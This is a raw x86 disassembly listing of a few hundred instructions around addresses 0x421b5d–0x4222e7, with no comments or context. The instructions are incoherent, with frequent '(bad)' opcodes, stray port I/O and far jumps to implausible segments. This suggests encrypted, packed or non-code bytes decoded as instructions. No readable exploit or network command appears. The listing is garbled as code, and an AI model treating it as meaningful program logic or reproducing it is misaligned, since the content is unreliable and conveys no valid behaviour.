  421b5d:	mov    ebp,0x6596374c
  421b62:	add    al,0x3d
  421b64:	cmp    BYTE PTR [ebx-0x52],bh
  421b67:	xor    ecx,DWORD PTR [edi+0x42]
  421b6a:	mov    ah,0xcf
  421b6c:	jnp    0x421b4b
  421b6e:	jo     0x421b8f
  421b70:	and    al,0xa9
  421b72:	xchg   edx,eax
  421b73:	mov    ah,0xf6
  421b75:	add    cl,bl
  421b77:	pop    eax
  421b78:	fnsave [ebp+0x7f]
  421b7b:	fdiv   QWORD PTR cs:[eax-0x1de78d9b]
  421b82:	stc    
  421b83:	cmp    al,0x53
  421b85:	lods   eax,DWORD PTR ds:[esi]
  421b86:	lahf   
  421b87:	xor    al,0x22
  421b89:	jp     0x421bea
  421b8b:	xchg   esp,eax
  421b8c:	lock nop
  421b8e:	mov    eax,ds:0xa1ad2943
  421b93:	jne    0x421b6a
  421b95:	and    DWORD PTR [edx+0x4a],0xabeea035
  421b9c:	mov    ss,WORD PTR [eax+ebx*8]
  421b9f:	ja     0x421b8b
  421ba1:	jno    0x421c0f
  421ba3:	shl    BYTE PTR [edi-0x49],1
  421ba6:	ss fimul WORD PTR ss:0x9b5594a
  421bae:	adc    edx,DWORD PTR [edi]
  421bb0:	lea    esi,[esi-0x2ea282d5]
  421bb6:	sbb    al,0x47
  421bb8:	mov    ebp,0x6a5031b7
  421bbd:	jb     0x421b54
  421bbf:	inc    esi
  421bc0:	mov    bh,0x28
  421bc2:	ja     0x421bb4
  421bc4:	dec    ebx
  421bc5:	mov    cl,0x32
  421bc7:	in     eax,0xf9
  421bc9:	sub    esi,DWORD PTR [ebx]
  421bcb:	adc    edx,DWORD PTR [esi+0x74]
  421bce:	xor    esp,DWORD PTR [esi-0x7fe6761e]
  421bd4:	scas   al,BYTE PTR es:[edi]
  421bd5:	or     al,0x90
  421bd7:	fwait
  421bd8:	or     al,cl
  421bda:	into   
  421bdb:	(bad)  
  421bdd:	sbb    BYTE PTR es:[ebp+0x57],ch
  421be1:	sub    ch,bh
  421be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421be4:	push   0x76339cf5
  421be9:	daa    
  421bea:	jo     0x421bc0
  421bec:	adc    ch,al
  421bee:	sbb    ebx,DWORD PTR [ebp+0x74]
  421bf1:	(bad)  
  421bf2:	loop   0x421bd7
  421bf4:	fistp  QWORD PTR [esi+0x50aabff3]
  421bfa:	fdiv   DWORD PTR es:[esi+0x2b721472]
  421c01:	fincstp 
  421c03:	pop    edi
  421c04:	jle    0x421c66
  421c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c07:	lds    eax,FWORD PTR [ebp+0x2]
  421c0a:	pop    ebp
  421c0b:	xchg   ebp,eax
  421c0c:	pop    edx
  421c0d:	cmc    
  421c0e:	jne    0x421c51
  421c10:	dec    esp
  421c11:	loope  0x421bcf
  421c13:	sub    BYTE PTR [edx-0x40],bl
  421c16:	and    eax,0x1d32cd3d
  421c1b:	adc    eax,0x1ec595cb
  421c20:	mov    BYTE PTR [edi],ah
  421c22:	cli    
  421c23:	lods   al,BYTE PTR ds:[esi]
  421c24:	sahf   
  421c25:	shr    DWORD PTR ss:[ecx],1
  421c28:	xchg   ecx,eax
  421c29:	in     al,0x3c
  421c2b:	jmp    0x421be5
  421c2d:	add    eax,DWORD PTR [edi-0x17]
  421c30:	push   esp
  421c31:	sub    al,0xc6
  421c33:	pushf  
  421c34:	aad    0x95
  421c36:	sub    esi,DWORD PTR [ebp+edi*2-0x5c]
  421c3a:	mov    ds:0xc8927665,al
  421c3f:	add    edx,DWORD PTR [ebp+0x2b]
  421c42:	ret    
  421c43:	shr    bh,0xde
  421c46:	out    0x8d,eax
  421c48:	or     al,0xb6
  421c4a:	ja     0x421bf0
  421c4c:	retf   
  421c4d:	or     bl,BYTE PTR [ecx]
  421c4f:	xchg   ebp,eax
  421c50:	fnsave [edx+0x48]
  421c53:	add    al,0xe9
  421c55:	push   esi
  421c56:	imul   ecx,DWORD PTR [ecx],0xffffff8e
  421c59:	add    BYTE PTR [edi+0x5c10a7fc],bl
  421c5f:	sub    eax,0xdf0603ff
  421c64:	ds aas 
  421c66:	loope  0x421c60
  421c68:	repnz mov gs,ecx
  421c6b:	fs adc al,0x3e
  421c6e:	mov    dh,ch
  421c70:	aaa    
  421c71:	cld    
  421c72:	stos   BYTE PTR es:[edi],al
  421c73:	push   edx
  421c74:	push   ds
  421c75:	adc    eax,0xf40107f8
  421c7a:	cld    
  421c7b:	and    edx,DWORD PTR es:[ebx-0x71]
  421c7f:	push   ss
  421c80:	inc    edx
  421c81:	sub    bl,al
  421c83:	aaa    
  421c84:	aaa    
  421c85:	push   es
  421c86:	loope  0x421c9f
  421c88:	push   0x38ed7f6c
  421c8d:	push   ebx
  421c8e:	das    
  421c8f:	ins    BYTE PTR es:[edi],dx
  421c90:	out    dx,eax
  421c91:	dec    ebp
  421c92:	imul   edi,DWORD PTR [edx-0x1f],0xffffffc8
  421c96:	xor    al,0xb4
  421c98:	adc    al,0xae
  421c9a:	rcr    BYTE PTR [esi],0x98
  421c9d:	cmp    al,0x9d
  421c9f:	xchg   esi,eax
  421ca0:	xchg   ecx,eax
  421ca1:	mov    ds:0x3b72c617,al
  421ca6:	shl    DWORD PTR [edi-0x1e],0x71
  421caa:	(bad)  
  421cab:	mov    eax,0x7bdd70b1
  421cb0:	out    0xaa,al
  421cb2:	mov    al,ds:0x7b23f7b9
  421cb7:	fild   WORD PTR [ebx-0x6cd8232b]
  421cbd:	dec    ebx
  421cbe:	std    
  421cbf:	mov    edx,DWORD PTR [ecx+0x14]
  421cc2:	and    BYTE PTR [ecx-0x6c],ah
  421cc5:	cdq    
  421cc6:	mov    ds:0xaf1b3369,eax
  421ccb:	outs   dx,BYTE PTR ds:[esi]
  421ccc:	mov    esi,0x4e5ec9f5
  421cd1:	pop    ss
  421cd2:	dec    ebx
  421cd3:	nop
  421cd4:	lahf   
  421cd5:	stos   BYTE PTR es:[edi],al
  421cd6:	ds jg  0x421c79
  421cd9:	sbb    eax,0x22716ce3
  421cde:	xor    eax,0x997b3ca
  421ce3:	stos   DWORD PTR es:[edi],eax
  421ce4:	mov    ch,0x8e
  421ce6:	or     esp,ebx
  421ce8:	fmul   DWORD PTR [ebx-0x30]
  421ceb:	loope  0x421d17
  421ced:	jne    0x421c87
  421cef:	mov    DWORD PTR [edi-0x5c5db408],ecx
  421cf5:	ins    DWORD PTR es:[edi],dx
  421cf6:	cmp    al,0xbb
  421cf8:	push   es
  421cf9:	push   es
  421cfa:	in     eax,dx
  421cfb:	xlat   BYTE PTR ds:[ebx]
  421cfc:	jae    0x421d59
  421cfe:	push   0xf1c970cf
  421d03:	cmp    eax,0x3150588d
  421d08:	xchg   edi,eax
  421d09:	nop
  421d0a:	pop    es
  421d0b:	xchg   esp,eax
  421d0c:	out    dx,eax
  421d0d:	mov    edx,DWORD PTR [esi+ebp*8]
  421d10:	cli    
  421d11:	adc    esp,ecx
  421d13:	imul   edx,esp,0xffffff97
  421d16:	dec    ebp
  421d17:	pop    ebx
  421d18:	sub    BYTE PTR ds:0x49b74155,0x8b
  421d1f:	cs dec edx
  421d21:	test   dh,dh
  421d23:	jp     0x421d71
  421d25:	shr    DWORD PTR [edx+0x6a],cl
  421d28:	or     al,0x55
  421d2a:	add    dh,BYTE PTR [ecx]
  421d2c:	outs   dx,BYTE PTR ds:[esi]
  421d2d:	es push ss
  421d2f:	aam    0x55
  421d31:	mov    ebp,0xcd80b10f
  421d36:	popf   
  421d37:	dec    esp
  421d38:	(bad)  
  421d39:	in     eax,0xaa
  421d3b:	add    BYTE PTR [ecx],ah
  421d3d:	pop    ebp
  421d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d3f:	and    BYTE PTR [ebx],0x87
  421d42:	out    0xd4,al
  421d44:	iret   
  421d45:	or     BYTE PTR [esi],0xb4
  421d48:	xor    DWORD PTR [esi+0x7d95e895],edx
  421d4e:	mov    dl,0xe5
  421d50:	and    eax,0xd3d7aa11
  421d55:	test   DWORD PTR [eax],ebx
  421d57:	pushf  
  421d58:	sbb    edi,ebp
  421d5a:	dec    edi
  421d5b:	int    0xb1
  421d5d:	push   0x7d
  421d5f:	jbe    0x421cfd
  421d61:	(bad)  
  421d62:	in     al,0x40
  421d64:	int3   
  421d65:	pushf  
  421d66:	and    BYTE PTR [ecx+eiz*2-0x2b],dl
  421d6a:	pop    eax
  421d6b:	cmp    DWORD PTR [ebx+0x2550a1d2],ebp
  421d71:	xchg   BYTE PTR [esp+edi*4-0x6],ah
  421d75:	ret    0x8288
  421d78:	jl     0x421da4
  421d7a:	mov    esp,cs
  421d7c:	xlat   BYTE PTR ds:[ebx]
  421d7d:	lods   eax,DWORD PTR ds:[esi]
  421d7e:	test   DWORD PTR [edx],0xc19bac4e
  421d84:	sbb    BYTE PTR [edx],dh
  421d86:	(bad)  
  421d87:	fild   WORD PTR [eax]
  421d89:	or     BYTE PTR [ecx+eiz*2-0x12d77636],0x9e
  421d91:	xor    eax,0x5f6d7b4e
  421d96:	imul   ebx,DWORD PTR [edx],0xffffff8f
  421d99:	imul   ecx
  421d9b:	hlt    
  421d9c:	ins    DWORD PTR es:[edi],dx
  421d9d:	out    dx,eax
  421d9e:	push   esp
  421d9f:	sar    BYTE PTR [ecx],cl
  421da1:	sub    BYTE PTR [ecx],0xb5
  421da4:	in     eax,dx
  421da5:	cmp    al,0xac
  421da7:	jmp    0x996f:0x5ac65675
  421dae:	mov    ebp,0xddd5c887
  421db3:	ja     0x421d48
  421db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db6:	mov    edx,0x4bff8c12
  421dbb:	scas   al,BYTE PTR es:[edi]
  421dbc:	(bad)  
  421dbd:	mov    ebx,0xda67eb34
  421dc2:	fsubrp st(1),st
  421dc4:	inc    ecx
  421dc5:	or     DWORD PTR [ecx],edi
  421dc7:	js     0x421df5
  421dc9:	add    DWORD PTR [ebx-0x3f],esp
  421dcc:	mov    ch,0x4a
  421dce:	or     al,al
  421dd0:	mov    esi,DWORD PTR [esi-0x19]
  421dd3:	or     al,0x23
  421dd5:	test   al,0x0
  421dd7:	test   bl,0xa1
  421dda:	and    cl,bh
  421ddc:	sub    cl,dl
  421dde:	xchg   ebp,eax
  421ddf:	es mov ah,0xda
  421de2:	hlt    
  421de3:	popa   
  421de4:	mov    ds:0x37d6a22f,al
  421de9:	sub    BYTE PTR [edx],bl
  421deb:	stos   DWORD PTR es:[edi],eax
  421dec:	arpl   WORD PTR [ebx+0x98264b7],cx
  421df2:	mov    bh,0x3b
  421df4:	ret    0xa34e
  421df7:	je     0x421e2c
  421df9:	mov    esi,0x60cada45
  421dfe:	inc    ecx
  421dff:	pop    es
  421e00:	jmp    0xbaf10e8a
  421e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e06:	popf   
  421e07:	adc    DWORD PTR [ecx+0x69ea0dc3],ebx
  421e0d:	jnp    0x421dfe
  421e0f:	test   DWORD PTR [esi-0x3e70fa1b],esp
  421e15:	cmp    eax,0xb94ad66f
  421e1a:	or     bh,ch
  421e1c:	adc    esp,DWORD PTR [edx+0x10]
  421e1f:	inc    esp
  421e20:	icebp  
  421e21:	loopne 0x421e9e
  421e23:	cmp    eax,0xb44dc407
  421e28:	gs jmp 0xc4fce42
  421e2e:	mov    cl,0xff
  421e30:	xor    BYTE PTR [edx],bl
  421e32:	pop    esp
  421e33:	js     0x421dc4
  421e35:	sbb    eax,0x55764d5f
  421e3a:	cmp    bl,BYTE PTR [ebx+0x32e4fe98]
  421e40:	mov    bl,0xab
  421e42:	mov    ebp,0xde741c37
  421e47:	fisttp WORD PTR [ecx-0x2b]
  421e4a:	push   eax
  421e4b:	out    0xf1,eax
  421e4d:	je     0x421e9b
  421e4f:	pop    esp
  421e50:	nop
  421e51:	(bad)  
  421e52:	hlt    
  421e53:	gs test al,0xc6
  421e56:	pop    ds
  421e57:	fcom   QWORD PTR [ebp+0x33]
  421e5a:	xor    eax,DWORD PTR [edi-0x70]
  421e5d:	dec    edx
  421e5e:	xor    eax,0xeb72127d
  421e63:	(bad)  
  421e64:	xor    ebp,esi
  421e66:	adc    dh,BYTE PTR [edi+ebp*2-0x6]
  421e6a:	mov    cl,0x9d
  421e6c:	shl    BYTE PTR [edx-0x41f54a65],1
  421e72:	ins    DWORD PTR es:[edi],dx
  421e73:	xchg   ecx,eax
  421e74:	fiadd  DWORD PTR [esi+0x66]
  421e77:	pushf  
  421e78:	adc    BYTE PTR [eax+0x4b463091],0xc6
  421e7f:	sub    al,0x2c
  421e81:	lods   eax,DWORD PTR ds:[esi]
  421e82:	pusha  
  421e83:	jp     0x421eb1
  421e85:	mov    ch,0xde
  421e87:	pop    eax
  421e88:	pop    esi
  421e89:	lock xchg ebp,eax
  421e8b:	aas    
  421e8c:	sahf   
  421e8d:	and    BYTE PTR [ebp-0xc8078c1],cl
  421e93:	dec    ecx
  421e94:	fcomip st,st(2)
  421e96:	in     al,0x89
  421e98:	mov    ecx,0x5e4ed592
  421e9d:	push   edi
  421e9e:	sti    
  421e9f:	and    esp,DWORD PTR [ebx-0x526caf]
  421ea5:	adc    dh,BYTE PTR [ebp+ebp*4-0x6b]
  421ea9:	in     al,dx
  421eaa:	add    BYTE PTR [edx],al
  421eac:	dec    eax
  421ead:	ss scas eax,DWORD PTR es:[edi]
  421eaf:	retf   0x28c2
  421eb2:	or     bl,BYTE PTR [edi]
  421eb4:	aaa    
  421eb5:	sti    
  421eb6:	pop    edi
  421eb7:	and    eax,0x97c9df12
  421ebc:	mov    ch,0x4d
  421ebe:	pop    ss
  421ebf:	ret    
  421ec0:	lock add BYTE PTR [edx+0x27ad85b5],bl
  421ec7:	fld    QWORD PTR [esi+eiz*8-0x4c83f984]
  421ece:	pop    ebp
  421ecf:	dec    edi
  421ed0:	mov    dh,0x88
  421ed2:	mov    al,ds:0x13446def
  421ed7:	xor    eax,DWORD PTR [eax]
  421ed9:	push   edx
  421eda:	adc    bh,BYTE PTR [edx-0x2fd89f35]
  421ee0:	adc    al,0xb0
  421ee2:	ds (bad) 
  421ee4:	sti    
  421ee5:	(bad)  
  421ee6:	lock imul ecx,DWORD PTR [ebx+eiz*2+0x10fe7c5e],0xffffffa2
  421eef:	out    dx,eax
  421ef0:	and    eax,0x4abd2920
  421ef5:	js     0x421ebf
  421ef7:	xchg   ebp,eax
  421ef8:	stos   BYTE PTR es:[edi],al
  421ef9:	les    eax,FWORD PTR [esi+ecx*1-0x62d07284]
  421f00:	scas   eax,DWORD PTR es:[edi]
  421f01:	popa   
  421f02:	cwde   
  421f03:	(bad)
  421f07:	fdiv   st(4),st
  421f09:	pop    ecx
  421f0a:	add    DWORD PTR ss:[esi],edi
  421f0d:	(bad)  
  421f0e:	sbb    esi,eax
  421f10:	mov    eax,ds:0xf420a8b1
  421f15:	jb     0x421f05
  421f17:	jmp    0x967485cd
  421f1c:	xlat   BYTE PTR ds:[ebx]
  421f1d:	dec    esi
  421f1e:	into   
  421f1f:	gs ins BYTE PTR es:[edi],dx
  421f21:	adc    DWORD PTR [ecx-0x39],ebp
  421f24:	test   eax,0xdd9481d4
  421f29:	jl     0x421f23
  421f2b:	xor    dl,dl
  421f2d:	dec    esi
  421f2e:	fcom   DWORD PTR [eax]
  421f30:	imul   eax,DWORD PTR [edx-0xb],0xffffffd7
  421f34:	les    edx,FWORD PTR [esi+0x481959b0]
  421f3a:	ror    BYTE PTR [edi+0x55880f85],cl
  421f40:	push   cs
  421f41:	(bad)  
  421f42:	mov    esi,0x777a28e6
  421f47:	inc    esp
  421f48:	je     0x421f9e
  421f4a:	iret   
  421f4b:	mov    ch,BYTE PTR [eax-0x7116c4b]
  421f51:	add    dh,ah
  421f53:	call   0xe312:0x489eb2e2
  421f5a:	inc    ecx
  421f5b:	xlat   BYTE PTR ds:[ebx]
  421f5c:	fisttp QWORD PTR [ecx+0x8518075]
  421f62:	pop    ebx
  421f63:	and    BYTE PTR [ebx+0x5b],ah
  421f66:	enter  0x1d7,0xbe
  421f6a:	ja     0x421f10
  421f6c:	data16 or dh,BYTE PTR [esi-0x2398be90]
  421f73:	xchg   esi,eax
  421f74:	les    edx,FWORD PTR [ecx-0x22cb2ba1]
  421f7a:	and    eax,0x14ef1eac
  421f7f:	xchg   ebx,eax
  421f80:	dec    eax
  421f81:	push   es
  421f82:	ror    bh,0x8
  421f85:	cmc    
  421f86:	jb     0x422002
  421f88:	fbld   TBYTE PTR [ebx]
  421f8a:	push   ebx
  421f8b:	add    bl,ch
  421f8d:	and    edi,DWORD PTR [edx+0x44]
  421f90:	inc    esp
  421f91:	dec    esi
  421f92:	pop    ss
  421f93:	lahf   
  421f94:	ins    DWORD PTR es:[edi],dx
  421f95:	aas    
  421f96:	adc    bh,dh
  421f98:	cmp    al,0xcf
  421f9a:	ja     0x421fe0
  421f9c:	pop    esp
  421f9d:	mov    ch,0xe9
  421f9f:	pop    esi
  421fa0:	mov    eax,ds:0x242b50e8
  421fa5:	jp     0x421f2f
  421fa7:	cmp    bl,BYTE PTR [esi+0x4c]
  421faa:	das    
  421fab:	mov    ds:0xdf6ba7f2,al
  421fb0:	(bad)  
  421fb1:	add    ah,bh
  421fb3:	jmp    0x421f8f
  421fb5:	stc    
  421fb6:	(bad)  
  421fb7:	sets   ah
  421fba:	sbb    BYTE PTR ss:[ebx+0x64955404],ah
  421fc1:	xchg   esi,eax
  421fc2:	jecxz  0x421f9f
  421fc4:	inc    esp
  421fc5:	sbb    bl,bh
  421fc7:	pop    esi
  421fc8:	retf   
  421fc9:	repnz xor DWORD PTR [eax-0x6d],ebx
  421fcd:	das    
  421fce:	out    dx,al
  421fcf:	xchg   ecx,eax
  421fd0:	add    al,0xf9
  421fd2:	fs xor eax,0x7e599c6f
  421fd8:	inc    ebp
  421fd9:	inc    edi
  421fda:	mov    eax,0xbb1fcc10
  421fdf:	test   eax,0x79c17a97
  421fe4:	mov    dl,0x7a
  421fe6:	out    0x8,eax
  421fe8:	jmp    0x422016
  421fea:	push   ebp
  421feb:	out    0x5f,al
  421fed:	(bad)  
  421fee:	jmp    0xa47f:0xe5794bd9
  421ff5:	call   0xaabaf5cc
  421ffa:	ret    
  421ffb:	push   eax
  421ffc:	pop    ebx
  421ffd:	ins    BYTE PTR es:[edi],dx
  421ffe:	xchg   esi,eax
  421fff:	(bad)  [esi]
  422001:	push   edx
  422002:	or     eax,0x11d56f7c
  422007:	cmp    ebp,eax
  422009:	mov    ds:0xaee63c3e,al
  42200e:	add    al,0xb
  422010:	loopne 0x422033
  422012:	pop    es
  422013:	jb     0x422054
  422015:	in     eax,0x57
  422017:	out    dx,al
  422018:	(bad)  
  422019:	stc    
  42201a:	xor    ah,BYTE PTR [edx+0x3d]
  42201d:	fst    st(5)
  42201f:	push   cs
  422020:	in     eax,0x2
  422022:	(bad)  
  422023:	pop    esp
  422024:	or     al,BYTE PTR [ebx+0x53aa9eed]
  42202a:	pop    ds
  42202b:	push   esp
  42202c:	xchg   esi,eax
  42202d:	inc    esp
  42202e:	and    edi,DWORD PTR [esi+0x5f]
  422031:	in     eax,0xd6
  422033:	test   al,0x31
  422035:	(bad)  
  422036:	outs   dx,BYTE PTR ds:[esi]
  422037:	outs   dx,DWORD PTR ds:[esi]
  422038:	or     BYTE PTR [esi-0x7dda02bc],ah
  42203e:	or     al,0x17
  422040:	aaa    
  422041:	popa   
  422042:	pushf  
  422043:	in     ax,dx
  422045:	jmp    0x434b4430
  42204a:	add    eax,0x19395d39
  42204f:	cmp    DWORD PTR [ecx-0x45],esi
  422052:	lods   al,BYTE PTR ds:[esi]
  422053:	or     dl,ch
  422055:	or     DWORD PTR [ebp+0x279724ea],ebx
  42205b:	and    BYTE PTR [ecx-0x9],dh
  42205e:	inc    edx
  42205f:	sbb    BYTE PTR [edi-0x72],bh
  422062:	or     ch,BYTE PTR [ebx+0x27f7549e]
  422068:	or     bl,cl
  42206a:	xor    ch,BYTE PTR [edx-0x53ecb331]
  422070:	jmp    0xa3cf:0xa2d330c0
  422077:	xchg   ecx,eax
  422078:	daa    
  422079:	dec    esp
  42207a:	cli    
  42207b:	mov    ebx,0x9662cf5a
  422080:	test   BYTE PTR [ebp+ecx*8-0x11],dh
  422084:	xchg   BYTE PTR [ecx+esi*4+0x15],bh
  422088:	pop    ebp
  422089:	push   eax
  42208a:	xchg   BYTE PTR [esi],bl
  42208c:	add    esi,DWORD PTR [edi]
  42208e:	mov    DWORD PTR [ecx+0x69e8fe23],esp
  422094:	add    BYTE PTR [eax-0xc9163e1],0xf4
  42209b:	inc    esi
  42209c:	ror    ebp,cl
  42209e:	sub    ch,al
  4220a0:	sub    DWORD PTR [eax+0x34],ecx
  4220a3:	push   eax
  4220a4:	scas   eax,DWORD PTR es:[edi]
  4220a5:	xlat   BYTE PTR ds:[ebx]
  4220a6:	(bad)
  4220a9:	push   cs
  4220aa:	jne    0x42205d
  4220ac:	cld    
  4220ad:	sub    BYTE PTR [ecx+ebp*4-0x62],0x2c
  4220b2:	outs   dx,DWORD PTR ds:[esi]
  4220b3:	and    BYTE PTR [ecx-0x42],cl
  4220b6:	rol    BYTE PTR ds:0xa395f367,0x9d
  4220bd:	add    esi,ecx
  4220bf:	sbb    DWORD PTR [esi+0x69],edx
  4220c2:	inc    ebp
  4220c3:	pusha  
  4220c4:	cmp    DWORD PTR [edi-0x75],edi
  4220c7:	es or  dl,0x17
  4220cb:	jmp    0x422115
  4220cd:	mov    edi,0x53650b43
  4220d2:	jne    0x42208e
  4220d4:	cmc    
  4220d5:	sar    ah,0xaf
  4220d8:	mov    ds:0xbd47dab7,al
  4220dd:	lods   eax,DWORD PTR ds:[esi]
  4220de:	int3   
  4220df:	xor    dh,BYTE PTR [esi+ecx*1]
  4220e2:	pusha  
  4220e3:	scas   al,BYTE PTR es:[edi]
  4220e4:	xchg   edi,eax
  4220e5:	add    ah,BYTE PTR [edi-0x641235c4]
  4220eb:	loopne 0x4220e4
  4220ed:	in     al,0xee
  4220ef:	dec    ecx
  4220f0:	test   eax,0x5fe9ca30
  4220f5:	mov    bh,0x6c
  4220f7:	xor    eax,0xd7fdc0c1
  4220fc:	outs   dx,BYTE PTR ds:[esi]
  4220fd:	jg     0x422123
  4220ff:	arpl   WORD PTR [edx+0x40],bp
  422102:	add    al,dl
  422104:	int    0xd2
  422106:	sti    
  422107:	adc    DWORD PTR [esi+esi*8],ebp
  42210a:	out    dx,al
  42210b:	push   ds
  42210c:	mov    ah,0xcb
  42210e:	jle    0x422108
  422110:	jg     0x4220d3
  422112:	inc    sp
  422114:	scas   al,BYTE PTR es:[edi]
  422115:	and    BYTE PTR [eax+0x4a],bl
  422118:	scas   al,BYTE PTR es:[edi]
  422119:	lods   eax,DWORD PTR ds:[esi]
  42211a:	xchg   ebp,eax
  42211b:	imul   esi,eax,0xffffffa1
  42211e:	fisttp WORD PTR [ecx+0x4c]
  422121:	push   esi
  422122:	add    DWORD PTR [edx-0x4aa06499],eax
  422128:	ds push edx
  42212a:	push   ecx
  42212b:	test   eax,0xb22b4baf
  422130:	cs dec eax
  422132:	loop   0x422122
  422134:	sub    ebx,DWORD PTR [ebx-0x4a]
  422137:	lea    eax,[edi+0x4a997f32]
  42213d:	out    dx,eax
  42213e:	popf   
  42213f:	ss inc esi
  422141:	pop    ss
  422142:	ss out dx,al
  422144:	cmc    
  422145:	mov    DWORD PTR ds:0xb7d9e05a,eax
  42214b:	and    dl,BYTE PTR [ebx+0x40e59bd1]
  422151:	retf   0x5078
  422154:	sub    DWORD PTR [eax],ebp
  422156:	int    0x70
  422158:	pop    ss
  422159:	stos   WORD PTR es:[edi],ax
  42215b:	in     eax,0x4a
  42215d:	push   cs
  42215e:	push   edx
  42215f:	fistp  QWORD PTR [ecx+0x4a]
  422162:	add    edi,ebp
  422164:	mov    eax,ds:0xf3de4f4c
  422169:	aaa    
  42216a:	out    0x71,eax
  42216c:	test   eax,0x13ffec17
  422171:	or     ah,bl
  422173:	ficomp WORD PTR [ebx+0xd]
  422176:	or     BYTE PTR [ebp-0x53],bh
  422179:	xor    BYTE PTR [ecx],bl
  42217b:	test   eax,0x4db4e1d7
  422180:	mov    ebp,0xa1f57e0a
  422185:	enter  0xbb8b,0xb1
  422189:	push   esp
  42218a:	or     al,0x4
  42218c:	dec    DWORD PTR [ebp+edi*1-0x62]
  422190:	scas   eax,DWORD PTR es:[edi]
  422191:	test   al,0xf0
  422193:	retf   
  422194:	test   BYTE PTR [edx],dh
  422196:	push   es
  422197:	not    DWORD PTR [esi-0x24]
  42219a:	es out 0x4c,al
  42219d:	mov    bh,0xdf
  42219f:	into   
  4221a0:	call   0xd3ad42d2
  4221a5:	push   ds
  4221a6:	je     0x4221c5
  4221a8:	stc    
  4221a9:	dec    esi
  4221aa:	pusha  
  4221ab:	mov    esi,0x686f5ea3
  4221b0:	cmp    cl,BYTE PTR [eax*8+0x5d8ba86c]
  4221b7:	addr16 enter 0xcbfd,0xe8
  4221bc:	cmp    DWORD PTR [eax+0x3fc2f421],esp
  4221c2:	xor    al,0xce
  4221c4:	retf   
  4221c5:	jbe    0x4221cc
  4221c7:	shr    ch,cl
  4221c9:	pop    ss
  4221ca:	aaa    
  4221cb:	rcl    DWORD PTR [edi-0x3c9b6ebd],1
  4221d1:	mov    ecx,0xd508473e
  4221d6:	or     al,0xf7
  4221d8:	loopne 0x4221e1
  4221da:	xlat   BYTE PTR ds:[ebx]
  4221db:	adc    dh,ah
  4221dd:	cmc    
  4221de:	sub    DWORD PTR ds:0x22911b7e,edx
  4221e4:	sub    dh,0xbe
  4221e7:	sub    DWORD PTR [ebx+0x595b3ba9],edx
  4221ed:	loopne 0x42217b
  4221ef:	retf   0x4c83
  4221f2:	out    dx,eax
  4221f3:	jg     0x4221ef
  4221f5:	mov    gs,esp
  4221f7:	aas    
  4221f8:	cli    
  4221f9:	inc    DWORD PTR [ecx+0x1faba86d]
  4221ff:	std    
  422200:	xchg   ecx,eax
  422201:	sahf   
  422202:	popa   
  422203:	pop    esi
  422204:	rol    BYTE PTR [ebx],1
  422206:	sbb    BYTE PTR [ecx+0x7f451450],ch
  42220c:	loopne 0x4221ad
  42220e:	mov    esp,0x9d076daa
  422213:	jne    0x4221ca
  422215:	push   ebp
  422216:	dec    edx
  422217:	add    ah,dl
  422219:	sub    ebx,DWORD PTR ds:0xc9d8624
  42221f:	mov    ch,0x4e
  422221:	push   0xfffffffa
  422223:	push   es
  422224:	stc    
  422225:	sbb    al,0x72
  422227:	out    0xef,al
  422229:	mov    dl,0x69
  42222b:	mov    edi,ds
  42222d:	mov    esi,0x6f518a15
  422232:	dec    ebp
  422233:	dec    ebp
  422234:	mov    ah,0xba
  422236:	mov    ah,BYTE PTR [ecx+0x5b7b873d]
  42223c:	repnz or eax,DWORD PTR [ebx+edi*1]
  422240:	div    BYTE PTR [esi-0x2e8398d]
  422246:	mov    ds:0x634afcf9,al
  42224b:	sbb    eax,ecx
  42224d:	cli    
  42224e:	ja     0x422289
  422250:	and    al,0x99
  422252:	push   eax
  422253:	hlt    
  422254:	aas    
  422255:	xor    DWORD PTR [ebx+0x3b0c9a62],edi
  42225b:	fadd   DWORD PTR [eax-0x56]
  42225e:	mov    ah,BYTE PTR [ebx]
  422260:	loopne 0x422247
  422262:	xchg   edi,eax
  422263:	inc    ebx
  422264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422265:	push   cs
  422266:	xor    eax,0x638616a2
  42226b:	shl    DWORD PTR [eax],1
  42226d:	fs add ebx,esp
  422270:	xor    eax,0xb344864a
  422275:	jb     0x422234
  422277:	test   al,0xca
  422279:	loope  0x42224a
  42227b:	sub    DWORD PTR [edi-0x5db2a5b4],edx
  422281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422282:	push   ss
  422283:	add    eax,0x1019b84f
  422288:	add    ah,ah
  42228a:	sub    edx,DWORD PTR [ecx+0x4d]
  42228d:	mov    eax,ds:0x3d0dfd8d
  422292:	adc    edx,DWORD PTR [edx+0x30]
  422295:	xor    DWORD PTR [eax+0x60],ebx
  422298:	xchg   edx,eax
  422299:	test   al,0x4d
  42229b:	dec    eax
  42229c:	mov    esi,0x26ca135a
  4222a1:	lods   al,BYTE PTR ds:[esi]
  4222a2:	jo     0x4222b1
  4222a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a5:	pop    edi
  4222a6:	bound  eax,QWORD PTR [ecx]
  4222a8:	mov    edi,0x79b2f40e
  4222ad:	mov    esp,0xed2dd563
  4222b2:	int3   
  4222b3:	dec    ebx
  4222b4:	dec    edi
  4222b5:	shr    BYTE PTR [edx],0x36
  4222b8:	jae    0x4222ed
  4222ba:	xor    dh,ah
  4222bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222bd:	std    
  4222be:	or     BYTE PTR [eax+0x15fd937f],ch
  4222c4:	pop    esp
  4222c5:	cwde   
  4222c6:	inc    edx
  4222c7:	into   
  4222c8:	pop    ebx
  4222c9:	fisub  WORD PTR [edx]
  4222cb:	xchg   ebp,eax
  4222cc:	fidiv  WORD PTR [ebp-0x26]
  4222cf:	bound  eax,QWORD PTR [edi-0x75]
  4222d2:	imul   edx,DWORD PTR [ecx],0x6f
  4222d5:	cmp    dl,BYTE PTR [edi-0x2d]
  4222d8:	sub    eax,0xbba42e91
  4222dd:	or     esp,DWORD PTR [ebp-0x76]
  4222e0:	(bad)  
  4222e1:	aaa    
  4222e2:	xchg   esi,eax
  4222e3:	std    
  4222e4:	(bad)  
  4222e5:	mov    es,WORD PTR [edx]
  4222e7:	shr    DWORD PTR [esp+eiz*2+0x12],0x74
